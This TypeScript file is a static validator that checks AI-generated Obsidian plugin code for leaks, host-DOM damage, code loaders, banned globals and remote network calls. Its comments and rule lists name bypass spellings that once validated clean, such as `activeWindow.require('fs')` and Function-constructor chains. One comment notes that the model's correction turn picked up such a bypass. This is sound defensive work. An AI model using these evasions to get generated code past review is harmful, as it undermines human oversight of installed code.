 * `owned` receiver assigning to its own property, so the reclaim lattice is right not to object —
 * and declared **nothing**. So did `new Image().src`, a `<link rel=prefetch>` whose removal was
 * even registered (the request is sent; removing the node does not un-send it), and an owned
 * `<style>` whose rule body is `url(https://…)`. All four validated at zero findings *and* zero
 * declarations on 2026-08-31, which is the state the review modal renders as "this mod does nothing
 * to anything but itself".
 *
 * These are the sinks a browser fetches from. The declaration fires only when a **remote scheme is
 * statically visible** in what lands there, so `img.src = this.app.vault.getResourcePath(file)` —
 * the ordinary, local, correct thing — stays silent, and a declaration list stays worth reading.
 */
const URL_SINK_PROPERTIES: ReadonlySet<string> = new Set([
  'src',
  'srcset',
  'href',
  'poster',
  'action',
  'formAction',
  'data',
  'textContent',
  'innerHTML',
  'cssText',
  'backgroundImage',
]);

/** The call spellings of the same sinks: `el.setAttribute("src", …)`, `sheet.insertRule(…)`. */
const URL_SINK_METHODS: ReadonlySet<string> = new Set([
  'setAttribute',
  'setAttr',
  'setAttribute_',
  'insertRule',
  'addRule',
  'setCssStyles',
  'setCssProps',
  'setProperty',
  'createEl',
  'createDiv',
  'createSpan',
  'insertAdjacentHTML',
]);

/** `https://…`, `wss://…` — an absolute, off-machine destination, written out in the source. */
const REMOTE_URL_RE = /\b(?:https?|wss?):\/\/[^\s'"`)\\]+/i;

/** Network egress, by the name the call is made through. */
const NETWORK_CALLS: ReadonlyMap<string, string> = new Map([
  ['requestUrl', 'sends a network request from the vault'],
  ['fetch', 'sends a network request from the vault'],
  ['sendBeacon', 'posts data to a remote endpoint with no response and nothing to reclaim'],
  ['send', 'sends data over an open socket'],
]);

/**
 * Destroying host DOM through the **teardown vocabulary**.
 *
 * `this.app.workspace.leftSplit.containerEl.empty()` wipes Obsidian's left sidebar, and `empty` is
 * in {@link TEARDOWN_CALLS} — so it read as a *reclaim* rather than as damage. Both halves are fixed:
 * a teardown only counts as a reclaim when its receiver is **owned** (see
 * {@link Analysis.collectTeardowns}), and destroying host DOM is declared here.
 */
const DOM_DESTRUCTION_METHODS: ReadonlyMap<string, string> = new Map([
  ['empty', "empties a part of Obsidian's own interface"],
  ['detach', "detaches a part of Obsidian's own interface"],
  ['remove', "removes a part of Obsidian's own interface"],
  ['removeChild', "removes a part of Obsidian's own interface"],
  ['replaceChildren', "replaces a part of Obsidian's own interface"],
]);

/**
 * Methods that put a node into the tree. The node has to come back out at unload.
 *
 * `insertAdjacentHTML` / `insertAdjacentText` are here even though they take a *string* rather than a
 * node, and so can never satisfy the "bind it to a const and register its removal" remedy. That is
 * the point: `activeDocument.head.insertAdjacentHTML("beforeend", "<style>…</style>")` is a permanent
 * write into the user's document with nothing to hold on to, it validated with zero findings on
 * 2026-08-31, and the honest answer for a mod is to build the element itself and register its
 * removal.
 */
const INSERT_METHODS: ReadonlySet<string> = new Set([
  'appendChild',
  'append',
  'prepend',
  'insertBefore',
  'insertAfter',
  'insertAdjacentElement',
  'insertAdjacentHTML',
  'insertAdjacentText',
  'replaceChild',
  'replaceWith',
  'after',
  'before',
]);

/**
 * The subset of {@link INSERT_METHODS} that **moves** an existing node rather than copying it.
 *
 * `box.appendChild(this.app.workspace.containerEl.firstChild)` takes an element *out of* Obsidian's
 * workspace tree — the DOM has one parent per node, so an insert is a removal at the other end. The
 * INSERT branch used to return the moment the *receiver* was owned, and never asked what was being
 * put in it, so this validated at zero findings while the registered teardown removed the mod's box
 * and left the workspace permanently short one element.
 */
const MOVING_INSERTS: ReadonlySet<string> = new Set([
  'appendChild',
  'append',
  'prepend',
  'insertBefore',
  'insertAfter',
  'insertAdjacentElement',
  'replaceChild',
  'replaceWith',
  'after',
  'before',
]);

/**
 * Additive mutations of a node the mod did not create. Removals are deliberately absent: a
 * `removeClass` is far more likely to *be* the teardown than to need one.
 */
const HOST_MUTATIONS: ReadonlySet<string> = new Set([
  'addClass',
  'addClasses',
  'toggleClass',
  'setAttribute',
  'setAttr',
  'setText',
  'setCssStyles',
  'setCssProps',
  // ⚠️ Two more spellings of "style the host permanently", both at zero findings on 2026-08-31:
  // `activeDocument.body.style.setProperty(…)` writes an inline style onto the user's <body>, and
  // `activeDocument.styleSheets[0].insertRule(…)` injects a rule into a sheet the mod does not own.
  // On something the mod created — `style.sheet.insertRule`, `myDiv.style.setProperty` — the
  // receiver is `owned` and neither fires, which is the same ownership question as everything else
  // here.
  'setProperty',
  'insertRule',
  'addRule',
]);

/**
 * Calls that *give something back*. Only these count as a reclaim.
 *
 * ⚠️ `facts.reclaimedNames` used to be **every identifier appearing anywhere inside any
 * `this.register(...)` argument**, head-matched on a dotted path. The template's own register block
 * mentions `self`, `holder`, `next`, `args` and `err`, so any leak whose receiver happened to be
 * called one of those was treated as reclaimed *by coincidence* — reproduced 2026-08-31 with a
 * second `<style>` bound to `const next` and appended to the host `<head>`: zero findings. A name is
 * reclaimed now only when it is the receiver of one of these calls, or an argument of one.
 */
const TEARDOWN_CALLS: ReadonlySet<string> = new Set([
  'remove',
  'removeChild',
  'removeClass',
  'removeClasses',
  'removeAttribute',
  'removeAttr',
  'detach',
  'empty',
  'disconnect',
  'unobserve',
  'close',
  'abort',
  'unload',
  'destroy',
  'dispose',
  'cancel',
  'off',
  'offref',
  'clearInterval',
  'clearTimeout',
  'cancelAnimationFrame',
  'cancelIdleCallback',
  'revokeObjectURL',
  'unregister',
]);

/**
 * Class methods whose whole body is a teardown, without any `this.register(...)` around it.
 *
 * `onunload()` is **Obsidian's own documented teardown hook** — it is where the API docs put a
 * `this.styleEl.remove()`, and the reclaim ledger used to reject it outright because it only ever
 * read the arguments of `this.register(...)`. That false rejection is worse than a missed leak:
 * `generate.ts` gives the model one correction turn, so a rejected-but-correct spelling pushes the
 * next attempt toward the one accepted spelling.
 */
const TEARDOWN_HOOKS: ReadonlySet<string> = new Set(['onunload', 'onClose']);

/**
 * The subset of {@link TEARDOWN_CALLS} that **destroys** rather than un-does.
 *
 * On something the mod created these are the reclaim. On something the host created they are the
 * damage, and reading them as a reclaim is how `leftSplit.containerEl.empty()` — Obsidian's sidebar,
 * wiped — came back clean *and* credited. The rest of the vocabulary (`removeClass`, `offref`,
 * `disconnect`, `unobserve`) undoes a change without destroying its subject, so it stays a reclaim
 * whoever owns the receiver.
 */
const DESTRUCTIVE_TEARDOWNS: ReadonlySet<string> = new Set([
  'empty',
  'remove',
  'removeChild',
  'detach',
]);

/**
 * Obsidian classes whose element fields are created, owned and **emptied** by Obsidian itself.
 *
 * `contentEl.addClass("modkit-x")` inside a `Modal`'s `onOpen()` is *the* canonical Obsidian idiom —
 * every example in the API docs does it, Obsidian calls `contentEl.empty()` on close, and nothing
 * leaks. `must-be-reclaimed` fired on it, which means any generated mod that opened a modal burned
 * its one correction turn on a non-defect. Knowing the superclass is what makes the exemption
 * narrow: the same call on an element reached through `this.app.workspace` is still a leak.
 */
const HOST_MANAGED_SUPERCLASSES: ReadonlySet<string> = new Set([
  'Modal',
  'SuggestModal',
  'FuzzySuggestModal',
  'ItemView',
  'View',
  'FileView',
  'TextFileView',
  'MarkdownView',
  'EditableFileView',
  'PluginSettingTab',
  'SettingTab',
  'AbstractInputSuggest',
]);

/** The fields those classes hand a subclass, and take back when they close. */
const HOST_MANAGED_FIELDS: ReadonlySet<string> = new Set([
  'contentEl',
  'containerEl',
  'modalEl',
  'titleEl',
  'headerEl',
  'navButtonsEl',
  'resultContainerEl',
  'inputEl',
  'emptyStateEl',
]);

/** Relational operators — the ones that make a version read a *range* check rather than a null test. */
const RANGE_OPERATORS: ReadonlySet<string> = new Set(['<', '>', '<=', '>=']);
const EQUALITY_OPERATORS: ReadonlySet<string> = new Set(['===', '!==', '==', '!=']);

/** Severity per rule. `error` blocks the artifact; `warning` is reported and shipped. */
const SEVERITY: Record<string, ValidationSeverity> = {
  parse: 'error',
  'no-top-level-side-effects': 'error',
  'no-bare-global': 'error',
  'no-host-assignment': 'error',
  'no-raw-timer': 'error',
  'no-raw-listener': 'error',
  'patch-must-be-registered': 'error',
  'no-eval': 'error',
  'import-not-allowed': 'error',
  'default-export-must-extend-plugin': 'error',
  'no-dynamic-host-member': 'error',
  'unguarded-internal-access': 'error',
  'missing-version-gate': 'error',
  'missing-no-effect-probe': 'error',
  'accessor-target': 'error',
  'bound-method-target': 'error',
  'event-must-be-registered': 'error',
  'must-be-reclaimed': 'error',
  /**
   * A loop or a self-rescheduling callback with no handle and no exit the validator can see.
   *
   * `async onload() { while (true) { await Promise.resolve(); … } }` is the accident, not the
   * attack: there is nothing to unload, `unload()` never gets a turn, and because the mod stays
   * *enabled* relaunching Obsidian re-hangs it. Recovery means editing community-plugins.json from
   * outside the app, which is not a thing a user can be asked to do.
   */
  'no-unstoppable-loop': 'error',
  /** The patch is installed behind a statically false condition, so the mod provably does nothing. */
  'unreachable-install': 'error',
  /** A wrapper that only calls through. Reported and shipped: only runtime can be sure. */
  'no-op-patch': 'warning',
  /**
   * A `<style>` element (or equivalent) written from JavaScript instead of shipped as `stylesCss`.
   * The table entry is the plane-E severity; `checkStyleInjection` overrides it to `warning` for
   * every other plane, where the same shape is legal but still worth naming.
   */
  'inject-stylesheet': 'error',
  /** A css-mode plane-E artifact with no `stylesCss` at all — the silent no-op L1 exists to kill. */
  'css-mod-without-stylesheet': 'error',
};

/* ────────────────────────────────────────────────────────────────────────────
 * The lattice
 * ──────────────────────────────────────────────────────────────────────────── */

/** See the file header. Ordered `static < owned < unknown < host`; `join` is `max`. */
export type Prov = 'static' | 'owned' | 'unknown' | 'host';

const PROV_RANK: Record<Prov, number> = { static: 0, owned: 1, unknown: 2, host: 3 };

function joinProv(a: Prov, b: Prov): Prov {
  return PROV_RANK[a] >= PROV_RANK[b] ? a : b;
}

/**
 * ⚠️ **`unknown` is `host`.** A flow the analysis could not follow is treated as reaching the host,
 * because the alternative — assuming the mod owns whatever it cannot explain — is exactly how the
 * nine bypasses in the file header validated clean.
 */
function isHostish(p: Prov): boolean {
  return p === 'host' || p === 'unknown';
}

/**
 * What to write *instead*, for one banned name.
 *
 * The DOM sentence is the fallback and only the fallback, because it was the whole message for every
 * name until 2026-08-31 — including `require`, `process`, `fetch` and `localStorage`, which have
 * nothing to do with the DOM. Naming `activeWindow` as the remedy for `require` is how the
 * correction turn learned to write `activeWindow.require("fs")`.
 */
function remedyFor(name: string): string {
  const specific = GLOBAL_REMEDIES.get(name);
  if (specific !== undefined) return specific;
  return (
    'use requestUrl/Notice from "obsidian", activeDocument/activeWindow for the DOM, or ' +
    'this.registerDomEvent(el, type, fn) / this.registerInterval(window.setInterval(fn, ms))'
  );
}

/* ────────────────────────────────────────────────────────────────────────────
 * Public surface
 * ──────────────────────────────────────────────────────────────────────────── */

export interface ValidateOptions {
  /** Which file the locations refer to. Lands in `ValidationFinding.file`. Default `main.js`. */
  file?: string;
  /** Overrides {@link ALLOWED_IMPORTS}. Rarely wanted; present so a test can prove the rule bites. */
  allowedImports?: readonly string[];
  /**
   * Whether to require the whole patch contract — the default export, the version gate, the
   * L0 pre-flight, the no-effect probe.
   *
   * `true` (the default) is what generation uses: the input is a complete `main.js`. Set it `false`
   * for `POST /v1/validate`'s dev introspection over a fragment, where the reclaim rules still apply
   * but "this file has no default export" is not news.
   */
  requireTemplateContract?: boolean;
  /**
   * The reach plane this patch targets, when known. Drives `inject-stylesheet`'s severity: `error`
   * on plane E, where a `<style>` element is never the right answer — `stylesCss` is — and
   * `warning` everywhere else, where a mod may legitimately add a class and should still route any
   * CSS it needs through `stylesCss` rather than injecting. Absent (a bare `validate()` call, or a
   * fragment with no known reach) reads as "not plane E" — the permissive default, since generation
   * always supplies this and a missing plane is a test or a dev-introspection call, not a mod.
   */
  reachPlane?: ReachPlaneId;
}

/**
 * Validate one generated `main.js`. Returns findings, most-important-first by source position.
 *
 * Never throws: an unparseable source comes back as a single `parse` finding, because a validator
 * that throws on bad input turns a rejected generation into a crashed daemon.
 */
export function validate(source: string, options: ValidateOptions = {}): ValidationFinding[] {
  return validateAll(source, options).findings;
}

/**
 * The same pass, with the **effects axis** included.
 *
 * `findings` is the reclaim contract — can Obsidian take this patch back. `effects` is the second
 * question, which nothing here modelled before 2026-08-31: what will this mod do to things that are
 * not itself, and which of those does unloading it *not* undo. They are separate on purpose. An
 * effect blocks nothing; it is what the review gate leads with, so the person installing the mod
 * decides.
 */
export function validateAll(source: string, options: ValidateOptions = {}): { findings: ValidationFinding[]; effects: EffectDeclaration[] } {
  const file = options.file ?? 'main.js';
  const allowedImports = options.allowedImports ?? ALLOWED_IMPORTS;
  const requireContract = options.requireTemplateContract !== false;

  const lines = source.split('\n');
  const lineStarts = computeLineStarts(source);

  const findings: ValidationFinding[] = [];
  const effects: EffectDeclaration[] = [];
  const add = (
    rule: RuleId,
    message: string,
    node: PositionedNode,
    // Almost every call wants the table's fixed severity; `inject-stylesheet` is the one rule whose
    // severity depends on which plane wrote it (error on E, warning elsewhere), so the override is
    // a parameter rather than a second copy of this function.
    severity: ValidationSeverity = SEVERITY[rule] ?? 'error',
  ): void => {
    const { line, column } = positionOf(node.start, lineStarts);
    const raw = lines[line - 1] ?? '';
    const excerpt = raw.trim().slice(0, 200);
    findings.push({
      rule,
      severity,
      message,
      line,
      column,
      ...(excerpt === '' ? {} : { excerpt }),
      file,
    });
  };
  const declare = (
    kind: EffectKind,
    call: string,
    subject: string | null,
    summary: string,
    node: PositionedNode,
  ): void => {
    const { line, column } = positionOf(node.start, lineStarts);
    // One declaration per call site. A wrapper body runs on every invocation, but the user is
    // deciding about the *mod*, and repeating the same sentence is how a list stops being read.
    if (effects.some((e) => e.line === line && e.column === column && e.kind === kind)) return;
    const raw = lines[line - 1] ?? '';
    const excerpt = raw.trim().slice(0, 200);
    effects.push({
      severity: 'declaration',
      kind,
      call,
      subject,
      summary,
      reversedOnUnload: false,
      line,
      column,
      ...(excerpt === '' ? {} : { excerpt }),
      file,
    });
  };

  let program: acorn.Program;
  try {
    program = acorn.parse(source, {
      ecmaVersion: 2022,
      sourceType: 'module',
      locations: false,
      allowAwaitOutsideFunction: false,
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    // `pos` is acorn's byte offset; without it we still owe the caller a location, so 1:1 it is.
    const pos = typeof (err as { pos?: unknown }).pos === 'number' ? (err as { pos: number }).pos : 0;
    const { line, column } = positionOf(pos, lineStarts);
    return {
      findings: [
        {
          rule: 'parse',
          severity: 'error',
          message: `not parseable as an ES module: ${message}`,
          line,
          column,
          file,
        },
      ],
      effects: [],
    };
  }

  const model = analyze(program);
  const consts = model.constStrings;

  /**
   * "Is this a write to something the mod does not own?" — asked of one *target expression*.
   *
   * ⚠️ `no-host-assignment` used to inspect exactly one node shape: an `AssignmentExpression` whose
   * left is a `MemberExpression`. Four ordinary spellings of the same write were therefore free —
   * `[h.getTasks] = [fn]`, `({ a: h.getTasks } = { a: fn })`, `for (h.getTasks of [fn]) {}`, and
   * `host.count++`. The question is about the target, so it is asked about the target.
   */
  const checkWriteTarget = (target: acorn.AnyNode, at: PositionedNode, scope: Scope, verb: string): boolean => {
    const left = unwrapChain(target);
    if (left.type !== 'MemberExpression') return false;
    if (model.internalRooted.has(left)) {
      add(
        'no-host-assignment',
        `${verb} a property reached through an undocumented app internal — patch through ` +
          "around(), never by assignment, and keep the mod's own state on `this`",
        at,
      );
      return true;
    }
    const recv = unwrapChain(left.object);
    const prov = model.provOf(recv, scope);
    if (!isHostish(prov)) return false;
    add(
      'no-host-assignment',
      `${verb} ${model.describe(recv, scope, prov)} — patch through around(), never by ` +
        "assignment, and keep the mod's own state on `this`",
      at,
    );
    return true;
  };

  checkTopLevel(program, add);
  checkConstructionTime(program, add);
  checkImports(program, allowedImports, add);
  if (requireContract) checkDefaultExport(program, model, add);
  checkStyleInjection(program, options.reachPlane, consts, add);

  walk.ancestor(program, {
    Identifier(node, _state, ancestors) {
      if (!isIdentifierRead(node, ancestors)) return;
      if (!BANNED_GLOBALS.has(node.name)) return;
      if (model.lookup(node.name, model.scopeFor(ancestors)) !== null) return;
      if (model.sanctionedGlobals.has(node)) return;
      add(
        'no-bare-global',
        `reads the global \`${node.name}\` outside a sanctioned this.register*() acquisition — ` +
          remedyFor(node.name),
        node,
      );
    },

    /**
     * "Does it own the thing it is writing to?" — one question, asked of the lattice.
     *
     * The receiver's provenance is the whole rule now. `owned` and `static` pass; `host` and
     * `unknown` are refused, which is what makes every spelling in the file header a finding
     * without any of them being enumerated here.
     */
    AssignmentExpression(node, _state, ancestors) {
      const scope0 = model.scopeFor(ancestors);
      // A destructuring assignment writes through a *pattern*, and every MemberExpression in it is
      // an assignment target: `[h.getTasks] = [fn]` and `({ a: h.getTasks } = { a: fn })`.
      if (node.left.type === 'ArrayPattern' || node.left.type === 'ObjectPattern') {
        for (const t of patternWriteTargets(node.left)) checkWriteTarget(t, node, scope0, 'assigns to');
        return;
      }
      if (node.left.type !== 'MemberExpression') return;
      const left = node.left;
      const scope = scope0;

      if (model.internalRooted.has(left)) {
        add(
          'no-host-assignment',
          'assigns to a property reached through an undocumented app internal — patch through ' +
            "around(), never by assignment, and keep the mod's own state on `this`",
          node,
        );
        return;
      }

      const target = unwrapChain(left.object);
      const prov = model.provOf(target, scope);
      if (isHostish(prov)) {
        add(
          'no-host-assignment',
          `assigns to ${model.describe(target, scope, prov)} — patch through around(), never by ` +
            "assignment, and keep the mod's own state on `this`",
          node,
        );
        return;
      }

      // Not host-owned, but still an acquisition: `el.onclick = fn`, `es.onmessage = fn`. Nothing
      // reclaims an on-handler at unload, so it outlives the mod exactly like a bare
      // addEventListener does.
      const prop = propertyName(left, consts);
      if (prop !== null && /^on[a-z]/.test(prop)) {
        add(
          'no-raw-listener',
          `assigns a handler to \`${prop}\` — an inline on-handler is never removed at unload; use ` +
            'this.registerDomEvent(el, type, fn), which Obsidian reclaims for you',
          node,
        );
      }
    },

    /** `host.count++` is an assignment with neither an `=` nor a call in it. */
    UpdateExpression(node, _state, ancestors) {
      checkWriteTarget(node.argument, node, model.scopeFor(ancestors), 'increments or decrements');
    },

    /** `for (h.getTasks of [fn]) {}` — a member assignment target in a loop head. */
    ForOfStatement(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      if (node.left.type === 'VariableDeclaration') return;
      for (const t of patternWriteTargets(node.left)) checkWriteTarget(t, node, scope, 'assigns to');
    },

    ForInStatement(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      if (node.left.type === 'VariableDeclaration') return;
      for (const t of patternWriteTargets(node.left)) checkWriteTarget(t, node, scope, 'assigns to');
    },

    CallExpression(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      // ⚠️ Not `calleeName`: a call through a *detached method binding* — `const s =
      // activeWindow.setInterval; s(fn, 100)` — carries the method's name on the binding, not on
      // the call site. Reproduced at zero findings on 2026-08-31.
      const name = model.calleeNameAt(node.callee, scope);

      if (name !== null && RAW_TIMER_CALLS.has(name)) {
        const isFrame = name === 'requestAnimationFrame' || name === 'requestIdleCallback';
        // There is no `register*` form for a frame request, so the *only* correct shape is to hold
        // the handle and register its cancel. Accepting that is what keeps this rule from being a
        // false rejection on the one mod that does it right — modkit's own picker writes it this way.
        const handle = isFrame ? boundTarget(ancestors) : null;
        const cancelled = handle !== null && model.keyReclaimed(model.reclaimKey(handle, scope));
        if (!model.sanctionedTimers.has(node) && !cancelled) {
          add(
            'no-raw-timer',
            isFrame
              ? `${name}() is not reclaimed on unload — a frame callback that reschedules itself ` +
                  'outlives the mod. Either use this.registerInterval(window.setInterval(fn, ms)), or ' +
                  `hold the handle and register the cancel: const f = activeWindow.${name}(fn); ` +
                  `this.register(() => activeWindow.${name === 'requestAnimationFrame' ? 'cancelAnimationFrame' : 'cancelIdleCallback'}(f))`
              : `${name}() is not reclaimed on unload — write this.registerInterval(window.${
                  name === 'setInterval' ? 'setInterval' : 'setTimeout'
                }(fn, ms))`,
            node,
          );
        }
      }

      if (name === 'addEventListener' || name === 'removeEventListener') {
        add(
          'no-raw-listener',
          `${name}() bypasses the reclaim contract — use this.registerDomEvent(el, type, fn), which ` +
            'Obsidian removes for you at unload',
          node,
        );
      }

      if (model.isAroundCall(node, scope) && !model.sanctionedAround.has(node)) {
        add(
          'patch-must-be-registered',
          'around() is not the direct argument of this.register(...), so its uninstaller is never ' +
            'registered and the patch outlives the mod — write this.register(around(holder, {...}))',
          node,
        );
      }

      if (name === 'eval') add('no-eval', 'eval() is never generated', node);
      if (name === 'Function' && node.callee.type === 'Identifier') {
        add('no-eval', 'Function() as a code constructor is never generated', node);
      }
      if (name === 'importScripts') add('no-eval', 'importScripts() is never generated', node);
      // `({}).constructor.constructor` and `(() => {}).constructor` are the Function constructor
      // reached without ever writing its name — a name-based no-eval is trivially evaded otherwise.
      if (name === 'constructor') {
        const callee = unwrapChain(node.callee);
        if (callee.type === 'MemberExpression' && unwrapChain(callee.object).type !== 'ThisExpression') {
          add(
            'no-eval',
            'calls `.constructor(...)` — reaching a constructor (and through it the Function ' +
              'constructor) by member access is a code loader; a mod\'s behaviour is fixed at build time',
            node,
          );
        }
      }
      // ⚠️ `isCodeLoader` was consulted **only** in the NewExpression visitor, and the Function
      // constructor does not need `new`: `const C = ({}).constructor; const F = C.constructor;
      // F("return 1")()` returned zero findings.
      {
        const calleeInner = unwrapChain(node.callee);
        if (
          calleeInner.type === 'Identifier' &&
          (model.lookup(calleeInner.name, scope)?.isCodeLoader ?? false)
        ) {
          add(
            'no-eval',
            `calls \`${calleeInner.name}\`, a binding that holds a \`.constructor\` reference — ` +
              'Function, AsyncFunction and GeneratorFunction are all reachable that way, and calling ' +
              'the Function constructor without `new` builds code exactly the same. A mod loads no ' +
              'code at runtime',
            node,
          );
        }
      }

      // ── mutator calls: an assignment with no AssignmentExpression in it ──
      const callee = unwrapChain(node.callee);
      const mutator = model.mutatorCallOf(node, scope);
      if (mutator !== null) {
        const allowed = MUTATOR_CALLS.get(mutator.holder);
        const arg0 = mutator.target;
        if (allowed?.has(mutator.method) && arg0 !== undefined) {
          const targetNode = unwrapChain(arg0);
          const prov = model.provOf(targetNode, mutator.targetScope);
          if (isHostish(prov)) {
            add(
              'no-host-assignment',
              `${mutator.holder}.${mutator.method}(...) writes to ` +
                `${model.describe(targetNode, mutator.targetScope, prov)} — it is an assignment with no \`=\` in ` +
                'it, and it is rejected for the same reason: patch through around(), never by ' +
                'writing to a host object',
              node,
            );
          }
        }
      }

      // ── the single most common Obsidian leak: an EventRef nobody registered ──
      if (name === 'on') {
        const receiver = model.eventReceiverOf(node, scope);
        if (receiver !== null && isHostish(receiver.prov) && !model.sanctionedEvents.has(node)) {
          add(
            'event-must-be-registered',
            'subscribes to a host event without registering the EventRef — the handler outlives the ' +
              'mod and fires against a dead object. Write ' +
              'this.registerEvent(this.app.workspace.on("...", fn)), with the on(...) call as the ' +
              'direct argument',
            node,
          );
        }
      }

      // ── DOM taken hold of, and never given back ──
      checkDomReclaim(node, callee, name, model, scope, consts, ancestors, add);

      // `this.register(x)` must at least be handed something callable. A bare arrow is a perfectly
      // ordinary teardown (`this.register(() => style.remove())`), so this check stays narrow: it
      // fires only on an argument that provably cannot be a function.
      if (isRegisterCall(node) && calleeProperty(node.callee, consts) === 'register') {
        const arg = node.arguments[0];
        if (arg === undefined || isNotCallable(arg)) {
          add(
            'patch-must-be-registered',
            'this.register(...) was handed something that cannot be an uninstaller — it must receive ' +
              'a function, normally around(...) directly',
            node,
          );
        }
        // ⚠️ `Component.register(cb)` takes **exactly one** callback. Obsidian drops the rest
        // silently, so `this.register(around(h, {a}), around(h, {b}))` registered the first
        // uninstaller and left the second patch alive through disable *and* uninstall — and the old
        // sanction loop, which walked every argument, called both of them registered.
        if (node.arguments.length > 1) {
          add(
            'patch-must-be-registered',
            `this.register(...) was given ${node.arguments.length} arguments — Component.register ` +
              'takes exactly one callback and silently ignores the rest, so every uninstaller after ' +
              'the first is never run and its patch outlives the mod. One this.register(...) call ' +
              'per uninstaller',
            node,
          );
        }
      }
    },

    NewExpression(node, _state, ancestors) {
      const scope = model.scopeFor(ancestors);
      const name = calleeName(node.callee, consts);
      if (name === 'Function') add('no-eval', 'new Function() is never generated', node);
      if (name === 'Worker' || name === 'SharedWorker') {
        add('no-eval', `new ${name}() loads code outside the reclaim contract`, node);
      }
      // `new (Object.getPrototypeOf(async function(){}).constructor)("return 1")` is the Function
      // constructor's async sibling, reached without ever writing a banned name.
      const ctorCallee = unwrapChain(node.callee);
      const viaMember =
        ctorCallee.type === 'MemberExpression' &&
        propertyName(ctorCallee, consts) === 'constructor' &&
        unwrapChain(ctorCallee.object).type !== 'ThisExpression';
      const viaBinding =
        ctorCallee.type === 'Identifier' &&
        (model.lookup(ctorCallee.name, scope)?.isCodeLoader ?? false);
      if (viaMember || viaBinding) {
        add(
          'no-eval',
          'constructs through a `.constructor` reference — Function, AsyncFunction and ' +
            'GeneratorFunction are all reachable that way, and a mod loads no code at runtime',
          node,
        );
      }
      const resolved = model.reclaimableCtorOf(node.callee, scope);
      const teardown = resolved === null ? undefined : RECLAIMABLE_CONSTRUCTORS.get(resolved);
      if (teardown !== undefined) {
        const boundNode = boundTarget(ancestors);
        const bound = boundNode === null ? null : model.reclaimKey(boundNode, scope);
        if (bound === null || !(model.reclaimedTeardowns.get(teardown)?.has(bound) ?? false)) {
          add(
            'must-be-reclaimed',
            `new ${name}(...) is never ${teardown === 'close' ? 'closed' : 'disconnected'} — bind it ` +
              `to a const and register the teardown: this.register(() => obs.${teardown}())`,
            node,
          );
        }
      }
    },

    ImportExpression(node) {
      add(
        'no-eval',
        'dynamic import() is a runtime code loader — a mod\'s dependencies are fixed at build time',
        node,
      );
    },

    /**
     * `delete target.constructor.prototype.someMethod` is a permanent, unregistered write to a host
     * object that carries neither an `AssignmentExpression` nor a call. Removing a member is a
     * *harder* change to undo than replacing one: the original value is gone the moment it runs.
     */
    UnaryExpression(node, _state, ancestors) {
      if (node.operator !== 'delete') return;
      const argument = unwrapChain(node.argument);
      if (argument.type !== 'MemberExpression') return;
      const scope = model.scopeFor(ancestors);
      const target = unwrapChain(argument.object);
      const prov = model.provOf(target, scope);
      if (!model.internalRooted.has(argument) && !isHostish(prov)) return;
      add(
        'no-host-assignment',
        `deletes a property of ${model.describe(target, scope, prov)} — a delete is an assignment ` +
          'with no `=` in it, and it destroys the original rather than wrapping it, so there is ' +
          'nothing for unload to put back. Patch through around(), which restores what it replaced',
        node,
      );
    },

    MemberExpression(node, _state, ancestors) {
      // ── a banned global reached as a MEMBER of a host window ──
      //
      // ⚠️ `const fs = activeWindow.require("fs")` is the whole node filesystem and, one line later,
      // `child_process` is arbitrary process execution — both at ZERO findings, while the bare
      // `require("fs")` control was blocked and the rejection *named activeWindow as the remedy*.
      // The member form is exactly as banned as the bare form now, and the message no longer hands
      // the correction turn a working spelling.
      {
        const prop = propertyName(node, consts);
        if (
          prop !== null &&
          MEMBER_BANNED_GLOBALS.has(prop) &&
          !model.sanctionedGlobals.has(node) &&
          model.isHostWindowExpr(node.object, model.scopeFor(ancestors))
        ) {
          const root = dottedPath(node.object, consts) ?? 'the window';
          add(
            'no-bare-global',
            `reads \`${root}.${prop}\` — a banned global reached as a member of the window is the ` +
              `banned global. ${remedyFor(prop)}`,
            node,
          );
        }
      }

      // ── the Function constructor, twice-chained and never named ──
      if (propertyName(node, consts) === 'constructor') {
        const object = unwrapChain(node.object);
        if (object.type === 'MemberExpression' && propertyName(object, consts) === 'constructor') {
          add(
            'no-eval',
            'reads `.constructor.constructor`, which is the Function constructor under another name ' +
              '— a mod loads no code at runtime',
            node,
          );
        }
      }

      // ── unguarded-internal-access ──
      if (model.internalRooted.has(node) && !node.optional) {
        const label = node.computed ? '[…]' : `.${propertyName(node, consts) ?? '?'}`;
        add(
          'unguarded-internal-access',
          `\`${label}\` reaches an undocumented internal without optional chaining — app.plugins, ` +
            'app.commands and app.viewRegistry are not in obsidian.d.ts, so every hop from one of ' +
            'them onward must be `?.` and a missing hop must be a refusal, never a throw',
          node,
        );
      }

      // ── no-dynamic-host-member ──
      if (!node.computed) return;
      const prop = node.property;
      if (model.internalRooted.has(node)) {
        // Strictest tier, and deliberately blind to `const` folding: the host graph is indexed with
        // string literals only, so `plugins[SOME_CONST]` is rejected even though it is innocent.
        const isLiteralKey =
          staticStringValue(prop) !== null ||
          (prop.type === 'Literal' && typeof prop.value === 'number');
        if (!isLiteralKey) {
          add(
            'no-dynamic-host-member',
            'indexes the host graph with a computed key — index it with a string literal, because a ' +
              'computed access is the trivial bypass for every name-based rule here',
            node,
          );
        }
        return;
      }
      // Second tier: any other object *known* to be the host's. Deliberately `=== 'host'` rather
      // than `isHostish`: this rule exists because a computed key blinds the name-based rules on a
      // host object, and extending it to `unknown` would reject `pa[i]` on a locally-computed array
      // whose provenance simply was not worth modelling. Writes to an `unknown` holder are already
      // refused by no-host-assignment, which is where fail-closed belongs.
      if (model.provOf(unwrapChain(node.object), model.scopeFor(ancestors)) !== 'host') return;
      const resolvable =
        staticStringValue(prop, consts) !== null ||
        (prop.type === 'Literal' && typeof prop.value === 'number');
      if (!resolvable) {
        add(
          'no-dynamic-host-member',
          'indexes a host object with a key that cannot be resolved at validation time — every ' +
            'name-based rule here (no-raw-listener, no-eval, no-host-assignment) is blind to it, so ' +
            'it is refused. Use a literal, or a const bound to one',
          node,
        );
      }
    },
  });

  if (requireContract) checkTemplateContract(program, model, add);
  checkLiveness(program, model, add);
  collectEffects(program, model, declare);

  findings.sort((a, b) => a.line - b.line || a.column - b.column || a.rule.localeCompare(b.rule));
  effects.sort((a, b) => a.line - b.line || a.column - b.column || a.kind.localeCompare(b.kind));
  return { findings, effects };
}

/**
 * The shape `index.ts` prefers when it wires the validator into the daemon.
 *
